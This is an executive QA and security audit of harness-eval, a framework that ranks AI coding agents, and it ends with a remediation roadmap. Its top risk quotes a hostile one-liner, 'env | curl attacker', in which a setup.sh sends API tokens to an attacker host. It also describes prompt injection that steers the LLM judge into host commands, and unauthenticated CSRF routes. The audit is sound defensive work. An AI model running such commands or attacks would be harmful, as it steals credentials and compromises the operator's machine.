# harness-eval — Executive Quality Summary

**Target:** `harness-eval` (github.com/natea/harness-eval) — commit `8814640`
**Date:** 2026-07-01
**Produced by:** 7-agent Agentic QE swarm, queen-coordinated (code quality, complexity, security, performance, QX, product-factors/test-strategy, tests).

---

## Project Overview

harness-eval is a TypeScript/Bun framework (~16.7K LOC src, 83 source files, 31 test files) that *definitively ranks agentic coding frameworks* by making each one build the **same PRD** inside an isolated sandbox (Daytona / E2B / Docker / macOS-VZ / worktree), driving a headless coding agent (Claude Code), then grading the artifact with two independent instruments: an evidence-based **evaluator agent** that runs a frozen, hash-bound test plan against the *running* build, and a **blind code-quality judge** (framework-marker-scrubbed copy, judge ≠ worker model). Outputs are a stable-schema `results.json` + `scorecard.md`, a read-only dashboard, and an in-review Eval Studio web UI. Because the product is a *measurement instrument that spends real money*, its dominant quality risks are **measurement validity** (a wrong number that looks authoritative) and **real-spend safety** — not conventional feature bugs.

### Scope & Method

Seven specialist QE agents each performed evidence-based **static analysis** of the checked-out repo, cross-citing `file:line` findings, plus **one real test run** (`bun test ./tests` → 212 tests, 197 pass / 11 skip / 4 fail, 129.6s) captured by the lead. No source was modified. No paid end-to-end run and no runtime pentest were performed. Findings below are drawn verbatim from the seven reports; the queen synthesized, ranked, and de-duplicated them.

---

## Overall Quality Verdict

**Engineering-grade codebase with a security posture that blocks shared/multi-tenant use.** The core is genuinely well-built: single-source Zod type discipline, rationale-rich comments, a robust orchestrator (bounded worker pool, failure classification, backoff, guaranteed teardown), and best-in-class *trust/transparency* UX (evidence-cited scores, visible provenance, inline fairness caveats). But the **grade phase and local review tooling undo the build-phase isolation**: untrusted agent-produced artifact code executes on the host with the operator's full credential set — a CRITICAL finding — and there is **no test CI**, so nothing gates regressions on merge.

### Per-Dimension Scorecard

| Dimension | Grade / Rating | One-line justification |
|-----------|:---:|------------------------|
| Code Quality (01) | **A−** | Single-source Zod schemas, ~0 type escapes, excellent "why" comments; loses A only on consistency (target-coupled grader, `Bun.file` vs `node:fs` drift). |
| Complexity / Maintainability (02) | **B** | Backend well-factored into short pure functions; ~60% of risk concentrated in the studio UI — `TrialView.tsx` is a 1243-LOC God component and 4 files exceed 500 lines. |
| Security (03) | **High risk** | 1 CRITICAL (untrusted host code exec at grade time + secret exfil), 3 HIGH (worktree host exec, Studio unauthenticated real-spend/host-exec + CSRF, OAuth-token redaction miss). |
| Performance (04) | **B** | Orchestrator core is exemplary; risk is downstream — serial grading (`trials × 15` LLM loops), O(n²) live-tap re-parse, uncached `runs/` rescans. Sound now, won't scale gracefully. |
| Quality Experience (05) | **B+** | A-tier trust/transparency and web UI; CLI onboarding is the weak link (no `--help`, a documented `bun test` footgun, high time-to-first-run). |
| Product Factors / Test Strategy (06) | **Strong strategy, gaps unclosed** | Correct validity-and-spend-first strategy with excellent spend-free seams; P0 gaps (redaction breadth, `scrub.ts`, evaluator contract) remain untested. |
| Tests (07) | **B−** | Broad, deep, behavioral suite with honest hermetic seams; dragged down by 4 failing tests, zero test CI, and the two riskiest surfaces (CLI, LLM judge) untested. |

---

## Top Risks (consolidated, ranked, cross-cutting)

1. **[CRITICAL — Security F1] Grading executes untrusted artifact code + model-chosen shell on the HOST with full env.**
   `grading/evaluator.ts:176`, `grading/judge.ts:125`, `grading/cc-driver.ts:67-82`, orchestrated by `orchestrator/grade.ts:98-149`. The built workspace is copied to `os.tmpdir()` (still the host) and an LLM evaluator is given a `bash -c` tool that spreads `...process.env`. Build isolation is undone at grade time: a hostile `setup.sh` (`env | curl attacker`) exfiltrates `CLOUDFLARE_API_TOKEN` (Zone.DNS edit), `DAYTONA/E2B/OPENAI` keys, etc., and prompt-injection of the judge LLM steers it into arbitrary host commands. **Reinforced by 06 R-P5 and 04's note that grading runs `cpSync` + host `bash`.**

2. **[HIGH cluster — the host-execution + web surface] Multiple paths run untrusted code on the host or trigger real spend without authentication.**
   - **F8:** Studio `POST /api/launch {confirmed:true}` (real spend) and `POST /api/preview/start {unsafeHost:true}` (host code exec) are **unauthenticated by default** (`STUDIO_OPERATOR_TOKEN` optional) and lack Origin/CSRF/Host checks — a page the operator visits can burn budget or run attacker code via a CORS-simple `fetch`. **This endpoint layer lives in the same studio module that 02 flags as the God-component hotspot — complexity and attack surface coincide.**
   - **F2:** `worktree` provider runs agent commands via `zsh -c` with all of `...process.env` (`providers/worktree.ts:56-70`) — and dry-runs default to it.
   - **F3:** `unsafeHost` preview runs the artifact's `setup.sh`/`start.sh` on the host.

3. **[HIGH — Security F4] Redaction drift: `CLAUDE_CODE_OAUTH_TOKEN` — the one secret injected into *every* native build — is not redacted** (`driver/archive.ts:15-35` vs `scheduler.ts:280-286`), so it can survive verbatim into archived `runs/…/transcripts` that are shared and served by the dashboards. **Independently surfaced as 06's top data-safety gap (R-D1/QR-2) — DASHSCOPE/KIMI/MINIMAX/ZAI shapes also lack patterns.**

4. **[P0 measurement-validity — Product 06 QR-1] Invalid-but-authoritative scores.** The evaluator/judge are LLM agents guarded only by prompt "hard rules" (no repairing, evidence-only, judge≠worker). These can't be mechanically proven, and the structural guards that *can* be tested — `scrub.ts` (the entire blind-judging basis) and evaluator fatal/partial contract — are **untested** (07 confirms `judge.ts` has no seam test).

5. **[P0 — Product 06 QR-3/QR-4] Real-spend overrun & failure misclassification.** `RunLedger` is a soft pre-dispatch gate that can overshoot by `concurrency × trialCostUsd` (~$50); `--grade` API cost is uncapped; and `isInfraFailure`'s message-regex can retry-and-rebill a candidate failure that merely prints "network".

6. **[Cross-cutting — 07/06] No test CI workflow.** Only `pages.yml` exists; `bun test`/`npm run check` never run on push/PR, so the red registry-drift test sits unguarded and no invariant (redaction, scoring, spend) is enforced on change.

---

## Key Strengths

- **Type & comment discipline (01):** entire domain modeled once as Zod schemas with `z.infer`; 0 `@ts-ignore`, 4 annotated `any`; comments capture operational "why" (auth billing traps, teardown time-box).
- **Robust orchestrator core (01/04):** bounded worker pool (no unbounded `Promise.all`), infra-vs-candidate failure classification, escalating backoff, cooperative cancellation, time-boxed leak-aware teardown, provenance at every terminal state.
- **Best-in-class trust/transparency UX (05):** every score carries cited evidence; provenance hashes and fairness caveats (cross-vendor judge, within-run speed/spend normalization, `inconclusive`/`right-censored`) are surfaced *inline*, not buried. CLI/UI validation parity is enforced via a shared module.
- **Deliberate build-phase isolation & positive security controls (03):** disposable sandboxes, env-only gitignored secrets, localhost-bound servers, `execFile` array-args (no host shell injection), judge≠worker enforced, blind-scrub before quality judging.
- **Honest, spend-free test seams (07/06):** injectable `Anthropic` transport, `MemoryProvider`/worktree, `STUB_MODE` fixtures, and a four-gate launch firewall that provisions *nothing* until authorized — deep behavioral assertions, no `.only`/committed `.skip`.

---

## Consolidated Prioritized Roadmap

### P0 — Security must-fix before any multi-tenant / shared / CI-hosted use
- **Sandbox the grade phase** — run evaluator/judge + artifact boot inside a disposable container with no host network, scrubbed/minimal env, read-only mount; never spread `process.env` into a shell that runs artifact code. *(03 F1; 06 R-P5/TP-11)*
- **Lock down the Studio** — require an operator token on *all* mutating routes; enforce Origin/Sec-Fetch-Site + Host allowlist; reject non-JSON bodies; add a CSRF token; gate `unsafeHost` behind a distinct confirmation. *(03 F8/F3)*
- **Fix redaction drift** — add `CLAUDE_CODE_OAUTH_TOKEN`/`ANTHROPIC_AUTH_TOKEN`/`CLOUDFLARE_API_TOKEN` + an OAuth-token regex; add a test asserting every `.env.example` var is covered. *(03 F4; 06 TP-05)*
- **Scrub env for host-execution paths** (worktree exec). *(03 F2)*
- **Stand up a test CI workflow** — `npm run check` + hermetic `bun test` as a required check; gate the 3 environment-dependent tests behind a `claudeAvailable()` probe or the fake-session seam. *(07 rec 1-2; 06 B.5)*
- **Close the top validity/spend test gaps** — `scrub.ts` marker removal, evaluator fatal/partial + unrecorded-step contract, `isInfraFailure` adversarial corpus, redaction breadth, run-ledger overshoot bound, `judge.ts` stubbed seam. *(06 TP-01/03/04/05/07; 07 rec 4)*

### P1 — Correctness, maintainability, and scaling
- Traversal-safe extraction of sandbox tarballs (symlink filtering) and validate `runId`/`trialId` before any path join or preview launch. *(03 F6/F7)*
- Decompose `TrialView.tsx` (1243) into shell + `TranscriptPanel`/`LiveStream`/`DemoRunner`; de-duplicate the transcript-parser trio; enforce the 500-line rule in CI. *(02 P0/P1)*
- Parallelize grading with a bounded, rate-limit-aware pool; cache the inverse-scaling/bracket aggregations; fix the live-tap O(n²) re-parse. *(04 C1/A1/I2)*
- Detach the grader prompts from the single hardcoded target ("Symphony"/"mock Linear"). *(01 #1)*
- Fix the brittle `toHaveLength(6)` assertion (registry now ships 8 candidates). *(07 F#1)*
- CLI parity/onboarding: `help`/`--help`, restate REAL SPEND with a confirm, surface the auth double-key billing pitfall in `.env.example`, guard-rail the `bun test` footgun. *(05 P1/P2)*

### P2 — Polish & completeness
- Paginate/stream the transcript API + virtualize the turn list; provider-aware CLI concurrency; single-pass redaction. *(04 I1/F1/C2/I3)*
- Bind the mock fixture server to `127.0.0.1`; allowlist link schemes in the Markdown renderer. *(03 F10/F9)*
- Accessibility hardening (emoji `aria-label`s, static "Scoring guide" fallback, contrast audit); declare the canonical UI; add a `docs/` index; coverage tooling. *(05 P3; 07 rec 7)*

---

## Test Strategy Headline & Biggest Coverage Gaps

**Headline (06):** the product is a *measurement instrument for money*, so the strategy is **validity-and-spend-first** — exhaustively unit-test scoring/normalization/redaction/classification math, contract-test the LLM instruments through their injectable `Anthropic` transport and the mock-Linear/stub-app-server oracles (never real spend in CI), reserve true paid runs for a documented operator smoke checklist, and stand up the missing test CI so the 197 green tests actually gate merges. The repo already has excellent spend-free seams; the work is to exploit them where risk is highest.

**Biggest coverage gaps (06 & 07):**
- **No test CI workflow** — highest-leverage fix.
- **Redaction breadth** — 5 configured provider key shapes + the OAuth token rely on env-value collection alone; binary-file leak path undocumented.
- **`scrub.ts`** — zero dedicated tests under the mechanism the whole blind-judging fairness claim rests on.
- **`grading/judge.ts` (the ranking authority) and `cli.ts` (the primary user surface)** — essentially untested.
- **Evaluator agent-contract semantics** (fatal/partial halt, unrecorded-step fill, empty-evidence rejection) and the **plugin-pin drift assert** — untested despite being core to validity and fairness.
- **The 4 failing tests:** 1 genuine stale-oracle assertion (registry 6→8), 3 environment-dependent worktree/detached dry runs that stall without an authenticated Claude Code binary.

---

## Caveats & Confidence

- This is **static analysis of an external repo at commit `8814640`**; findings are labeled STATIC/INFERRED across the reports. No paid end-to-end run and **no runtime penetration test** were performed — the CRITICAL and HIGH security findings are traced through the code (CONFIRMED) or dependency-behavior-dependent (POTENTIAL, e.g. tar symlink traversal F6), not exploit-proven.
- The **4 test failures** are diagnosed, not all product bugs: 1 is a brittle assertion, 3 are environment-dependent (absent authed binary), so the effective product-signal failure count is ~1. The 197 passes were captured in a single run, not re-verified across environments.
- Complexity **churn analysis was unavailable** (squashed git history — every file shows 1 commit), so hotspot rankings use size × static-complexity only. Cyclomatic values are lexical proxies (`CC≈`), not tool-verified.
- Confidence is **high** for the security and test-suite findings (concrete `file:line`, one executed run), **medium** for the super-linear performance claims (need the benchmarks 04 suggests) and the QX/accessibility judgments (no automated a11y/contrast pass run).
